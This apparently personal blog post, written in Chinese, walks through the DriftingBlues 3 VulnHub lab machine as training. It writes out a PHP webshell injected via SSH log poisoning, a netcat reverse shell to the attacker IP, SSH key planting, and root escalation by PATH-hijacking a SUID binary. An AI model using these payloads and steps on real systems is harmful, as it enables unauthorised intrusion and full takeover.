---
layout:     post
title:      "vulnhub_DriftingBlues_3"
subtitle:   信息搜集/php脚本解析getshell/错误配置的二进制文件提权
date:       2024-6-11
author:     Robin
header-img: img/post-bg-cook.jpg
catalog: true
tags:
    - Note
    - Linux
    - Information security
    - vulnhub
---
# 靶机 DriftingBlues：3

## 1. 获取靶机

![]({{ "assets/2024-06-11-15-30-44-image.png" | absolute_url }})

靶机导入到virtualbox，采用桥接网卡模式，攻击机上使用`arp-scan` 探测到靶机mac对应的ip

![]({{ "assets/2024-06-11-15-31-27-image.png" | absolute_url }})

## 2. 信息搜集

### 2.1 端口扫描

`nmap -A -sV -T4 -p- 10.1.1.36`

全端口高级扫描，发现了22和80端口开放

![]({{ "assets/2024-06-11-15-32-25-image.png" | absolute_url }})

### 2.2 探索获取的端口服务

nmap扫描提示80端口有可疑路径信息，用`dirsearch` 对web路径进行爆破，发现更多路径

![]({{ "assets/2024-06-11-15-34-53-image.png" | absolute_url }})

扫描出来的路径文件中，大部分信息无明显有效敏感信息，但是在`/robots.txt` 找到一个隐藏路径`/eventadmins`，打开后有提示一个新路径`/littlequeenofspades.html`

![]({{ "assets/2024-06-11-15-37-52-image.png" | absolute_url }})

![]({{ "assets/2024-06-11-15-38-13-image.png" | absolute_url }})

打开信息提示页面后，有一段故事，页面无其他信息，但是html源代码中隐藏了一段base64编码

![]({{ "assets/2024-06-11-15-42-01-image.png" | absolute_url }})

用CyberChef对base64进行解密，发现其中有两段密文

第一段：![]({{ "assets/2024-06-11-15-53-30-image.png" | absolute_url }})

其中第二段：![]({{ "assets/2024-06-11-15-53-57-image.png" | absolute_url }})



访问第二段的路径，发现一个ssh登录日志的查看页面：

![]({{ "assets/2024-06-11-15-55-37-image.png" | absolute_url }})

## 3. 渗透测试

### 3.1 利用登录日志查看页面植入代码

尝试将登录用户名替换为php的webshell

`'<?php system($_GET["x"]); ?>'` ，必须带引号，否则日志文件解析失败

![]({{ "assets/2024-06-11-15-59-35-image.png" | absolute_url }})

### 3.2 成功获得执行命令权限

访问页面，指定`x` 参数为系统命令，在日志页面看到执行的返回结果

![]({{ "assets/2024-06-11-16-01-47-image.png" | absolute_url }})

### 3.3 反弹shell到攻击机

调用`netcat` 反弹shell到攻击机，但用户是`www-data`

`netcat 10.1.1.102 32201 -e /bin/bash`

![]({{ "assets/2024-06-11-16-13-45-image.png" | absolute_url }})

将反弹shell转换为tty交互shell

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

### 3.4 继续用获得的shell进行信息搜集

#### 3.4.1 找到一个用户目录robertj

![]({{ "assets/2024-06-11-16-37-52-image.png" | absolute_url }})

#### 3.4.2 为用户生成密钥获得登录

`ssh-keygen -t rsa` 生成过程中指定路径为robertj的.ssh目录

将生成的id_rsa.pub加入到当前目录的authorized_keys文件

![]({{ "assets/2024-06-11-16-45-46-image.png" | absolute_url }})

将私钥复制到攻击机，用ssh带密钥文件登录成功

`ssh robertj@10.1.1.36 -i id_rsa`

![]({{ "assets/2024-06-11-16-48-35-image.png" | absolute_url }})

### 3.5 在当前用户目录下获取flag1

![]({{ "assets/2024-06-11-16-49-47-image.png" | absolute_url }})

### 3.6 继续用当前用户搜集信息

#### 3.6.1 找到制执行权限配置不当的文件

利用`find` 命令寻找当前用户可执行，且执行身份为root的可执行文件

`find / -perm -u=s -type f 2>/dev/null`

找到一个不常见的`/usr/bin/getinfo` 二进制文件

![]({{ "assets/2024-06-11-18-27-31-image.png" | absolute_url }})

#### 3.6.2 调查二进制文件，疑似执行系统命令

![]({{ "assets/2024-06-11-18-29-48-image.png" | absolute_url }})

查看文件内容，疑似执行系统命令来显示信息

![]({{ "assets/2024-06-11-18-30-48-image.png" | absolute_url }})

### 3.7 尝试替换程序调用的系统命令进行提权

通过前面的执行结果，判断程序调用了系统的`ip` 命令，于是尝试用自己的脚本替换掉系统命令`ip` 但是由于`/usr/bin` 不可写，因此尝试修改系统的路径搜索顺序，直接执行自己创建的`ip` 命令

![]({{ "assets/2024-06-11-18-52-30-image.png" | absolute_url }})

再执行`/usr/bin/getinfo` ，获得root权限的shell，

![]({{ "assets/2024-06-11-18-55-12-image.png" | absolute_url }})

*如果ip命令的搜索顺序没有替换成当前路径下的ip脚本，尝试用`hash -r` 来刷新系统维护的命令路径hash表*

### 3.8 在root目录下获得flag2

渗透测试完成

![]({{ "assets/2024-06-11-18-55-55-image.png" | absolute_url }})
